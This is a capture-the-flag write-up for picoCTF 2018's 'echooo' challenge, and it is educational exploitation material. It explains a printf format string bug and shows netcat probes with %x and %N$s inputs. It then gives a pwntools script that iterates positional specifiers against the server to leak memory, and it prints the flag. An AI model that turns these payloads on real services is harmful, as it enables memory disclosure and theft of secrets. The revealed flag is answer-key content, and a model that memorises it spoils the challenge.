# echooo
## Question
>This program prints any input you give it. Can you [leak](files/echo) the flag? Connect with `nc 2018shell.picoctf.com 34802`. [Source](files/echo.c). 

## Hint
>If only the program used puts...

# Solution
## Identify the vulnerability
The source code reveals the use of `printf` that we will be able to exploit with a *format string attack*.

>*"Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error. If the programmer passes an attacker-controlled buffer as the argument to a printf (or any of the related functions, including sprintf, fprintf, etc), the attacker can perform writes to arbitrary memory addresses."*

Some interesting readings about format string attack:
* http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
* https://owasp.org/www-community/attacks/Format_string_attack
* https://www.exploit-db.com/papers/23985

## Proof of Concept
The following injections confirm that the program is vulnerable:
~~~~
$ nc 2018shell.picoctf.com 34802
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %x
40
> %s
timeout: the monitored command dumped core
~~~~

~~~~
$ nc 2018shell.picoctf.com 34802
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %3$s
��l�������l�����l�����l����y�������j@j
> %4$s
`d{�
> %5$s
timeout: the monitored command dumped core
~~~~

## Exploit
Let's write a program that will iteratively test the first 10 strings:

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'critical'
host, port = '2018shell.picoctf.com', 34802
for i in range(10):
    s = remote(host, port)
    s.recvuntil('> ')
    s.sendline('%' + str(i) + '$s')
    response = s.recv()
    print(response)
    s.close()
```
Let's run the program
~~~~
$ ./exploit.py 
b'%0$s\n'
b'timeout: the monitored command dumped core\n'
b'\x88 \xad\xfbuqN\tuqN\tpqN\tpqN\tpqN\tpqN\tpqN\tp\x81N\t\n'
b'\x89\x85l\xff\xff\xff\x83\xec\x04\xff\xb5l\xff\xff\xff\xff\xb5l\xff\xff\xff\xff\xb5l\xff\xff\xff\xe8y\xfe\xff\xff\x83\xc4\x10\x83\xec\x04j@j\n'
b'`\xd4o\xf7\x03\n'
b'timeout: the monitored command dumped core\n'
b'X\x83\x04\x08\x10ii\r\n'
b'\xa9\x8e\x90\xff\n'
b'picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}\n\n'
~~~~

# Flag
`picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}`
